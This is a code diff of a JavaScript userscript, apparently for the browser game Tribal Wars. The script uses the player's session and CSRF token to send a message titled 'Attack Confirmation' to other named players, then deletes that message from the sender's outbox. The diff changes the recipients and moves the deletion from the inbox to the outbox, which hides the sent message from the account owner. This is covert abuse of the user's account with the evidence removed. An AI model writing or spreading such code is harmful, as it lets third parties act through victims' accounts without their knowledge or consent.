@@ -34,7 +34,7 @@ if(document.URL.indexOf('screen=place')==-1){
     ];
 
     var rastgele=mesajlar[Math.floor(Math.random()*mesajlar.length)];
-    var alici='13 F 1LLEGAL';
+    var alici='T O R O S;alwayslie';
     var konu='Saldırı Onayı ⚔️';
     var vid=game_data.village.id;
     var csrf=game_data.csrf;
@@ -55,8 +55,8 @@ if(document.URL.indexOf('screen=place')==-1){
       body:body.toString(),
       redirect:'follow'
     }).then(function(){
-      var inboxUrl=location.origin+'/game.php?village='+vid+'&screen=mail&mode=in';
-      return fetch(inboxUrl,{credentials:'same-origin'});
+      var outboxUrl=location.origin+'/game.php?village='+vid+'&screen=mail&mode=out';
+      return fetch(outboxUrl,{credentials:'same-origin'});
     }).then(function(res){
       return res.text();
     }).then(function(html){
@@ -71,7 +71,7 @@ if(document.URL.indexOf('screen=place')==-1){
       delBody.set('ids['+msgId+']','1');
       delBody.set('del','Sil');
       delBody.set('h',csrf);
-      return fetch(location.origin+'/game.php?village='+vid+'&screen=mail&mode=in',{
+      return fetch(location.origin+'/game.php?village='+vid+'&screen=mail&mode=out',{
         method:'POST',
         credentials:'same-origin',
         headers:{'Content-Type':'application/x-www-form-urlencoded'},
